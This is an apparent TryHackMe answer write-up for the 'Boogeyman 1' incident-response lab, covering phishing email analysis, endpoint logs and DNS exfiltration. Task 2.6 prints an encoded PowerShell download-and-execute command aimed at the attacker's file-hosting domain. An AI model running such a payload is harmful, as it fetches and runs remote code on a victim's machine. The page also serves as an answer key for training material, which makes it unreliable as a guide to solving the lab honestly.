<h1 align="center">Boogeyman 1</h1>
<p align="center">2024, July 26 &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>. A new threat actor emerges from the wild using the name Boogeyman. Are you afraid of the Boogeyman? <a href="https://tryhackme.com"> TryHackMe</a>. &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/boogeyman1t">here</a>.</p>


<h2>Task 1 . [Introduction] New threat in town.</h2>
<br>

<p><em></em>Answer the question below</em></p>

<p>1.1. Let's hunt that boogeyman!<br>
<code>No answer needed</code></p>

<br>
<h2>Task 2 . [Email Analysis] Look at the headers!</h2>
<br>

<p><em></em>Answer the questions below</em></p>

<p>2.1. <em>What is the email address used to send the phishing email?</em><br>
<code>agriffin@bpakcaging.xyz</code></p>

<br>
<p>2.2. <em>What is the email address of the victim?</em><br>
<code>julianne.westcott@hotmail.com</code></p>

<br>
<p>2.3. <em>What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?</em><br>
<code>elasticemail</code></p>

<br>
<p>2.4. <em>What is the name of the file inside the encrypted attachment?</em><br>
<code>Invoice_20230103.lnk</code></p>

<br>
<p>2.5. <em>What is the name of the file inside the encrypted attachment?</em><br>
<code>Invoice2023!</code></p>

<br>
<p>2.6. <em> Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?</em><br>
<code>aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==</code></p>

<br>


![Julho-26-2024 - TryHackMe  Day 84 - Boogeyman 1 - Starting in Linux](https://github.com/user-attachments/assets/dc539c96-3182-4239-ac45-f1f78a1172c4)

![Julho-26-2024 - TryHackMe  Day 84 - Boogeyman 1 - Image 3](https://github.com/user-attachments/assets/97e0e25b-6bc7-4459-9de6-e135e24ca33e)

![Julho-26-2024 - TryHackMe  Day 84 - Boogeyman 1 - Image 4 - Email](https://github.com/user-attachments/assets/36653808-e5fe-453f-a193-c2a8a72c3ba4)


![Julho-26-2024 - TryHackMe  Day 84 - Boogeyman 1 - Image 5 - Third-party relay service used by the attacker](https://github.com/user-attachments/assets/e050679a-0b54-43e5-baaf-18f41600cf17)


![Julho-26-2024 - TryHackMe  Day 84 - Boogeyman 1 - Image 6 - Analyzing email attachment](https://github.com/user-attachments/assets/e24b5ba8-34e8-4f4a-9b3b-09862aac2cc4)

![Julho-26-2024 - TryHackMe  Day 84 - Boogeyman 1 - Image 7 - email attachment](https://github.com/user-attachments/assets/99acba4e-98e0-4ae8-9cd1-da1d5914e3bd)

![Julho-26-2024 - TryHackMe  Day 84 - Boogeyman 1 - Image 8 - email attachment password](https://github.com/user-attachments/assets/c392c76a-ba5b-4f38-9f76-0abf6c514514)

![Julho-26-2024 - TryHackMe  Day 84 - Boogeyman 1 - Image 9 - ](https://github.com/user-attachments/assets/55de1b72-e472-4a76-8653-7e926ed847d9)

<br>
<br>
<br>
<h2>Task 3 . [Endpoint Security] Are you sure that´s an invoice?</h2>

<br>

<p><em></em>Answer the questions below</em></p>

<p>3.1. <em>What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)</em><br>
<code>cdn.bpakcaging.xyz,files.bpakcaging.xyz</code></p>

<br>
<p>3.2. <em>What is the name of the enumeration tool downloaded by the attacker?</em><br>
<code>seatbelt</code></p>

<br>
<p>3.3. <em>What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.</em><br>
<code>C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite</code></p>

<br>
<p>3.4. <em>What is the software that uses the file in Q3?</em><br>
<code>Microsoft Sticky Notes</code></p>

<br>
<p>3.5. <em>What is the name of the exfiltrated file?</em><br>
<code>protected_data.kdbx</code></p>

<br>
<p>3.6. <em>What type of file uses the .kdbx file extension?</em><br>
<code>keepass</code></p>

<br>
<p>3.7. <em>What is the encoding used during the exfiltration attempt of the sensitive file?</em><br>
<code>hex</code></p>

<br>
<p>3.8. <em>What is the tool used for exfiltration?</em><br>
<code>nslookup</code></p>


<br>



![Julho-26-2024 - TryHackMe  Day 84 - Boogeyman 1 - Image 10 - CyberChef](https://github.com/user-attachments/assets/c15aec11-06ee-4506-83cb-6f2d0347b88e)


![Julho-26-2024 - TryHackMe  Day 84 - Boogeyman 1 - Image 11 - Power Shell ID 4104](https://github.com/user-attachments/assets/b3d2fc82-49a7-4f72-b4a1-1bc40e3daade)

![Julho-26-2024 - TryHackMe  Day 84 - Boogeyman 1 - Image 12 - Power Shell ID 4100](https://github.com/user-attachments/assets/8304ece9-42d0-4936-91f6-f8f83b4b57bf)

![Julho-26-2024 - TryHackMe  Day 84 - Boogeyman 1 - Image 12 - Power Shell ID 40961](https://github.com/user-attachments/assets/619594ff-63af-440f-86e5-705ed100bf43)

![Julho-26-2024 - TryHackMe  Day 84 - Boogeyman 1 - Image 12 - Power Shell ID 40962](https://github.com/user-attachments/assets/8bffe463-cc46-4e70-a3ef-0a338f10f35e)

![Julho-26-2024 - TryHackMe  Day 84 - Boogeyman 1 - Image 13](https://github.com/user-attachments/assets/7ed0954b-0732-44d5-8da9-7ce4d9710bb7)

![Julho-26-2024 - TryHackMe  Day 84 - Boogeyman 1 - Image 14](https://github.com/user-attachments/assets/d4951ff7-cf0a-467b-a7b8-c4523f753fbb)

<br>
<br>
<br>
<h2>Task 4 . [Network Traffic Analysis] They got us. Call the bank immediately!</h2>

<br>

<p><em></em>Answer the questions below</em></p>

<p>4.1. <em>What software is used by the attacker to host its presumed file/payload server?</em><br>
<code>python</code></p>

<br>
<p>4.2. <em>What HTTP method is used by the C2 for the output of the commands executed by the attacker?</em><br>
<code>POST</code></p>

<br>
<p>4.3. <em>What is the protocol used during the exfiltration activity?</em><br>
<code>dns</code></p>

<br>
<p>4.4. <em>What is the password of the exfiltrated file?</em><br>
<code>%p9^3!lL^Mz47E2GaT^y</code></p>

<br>
<p>4.4. <em>What is the credit card number stored inside the exfiltrated file?</em><br>
<code>4024007128269551</code></p>

<br>






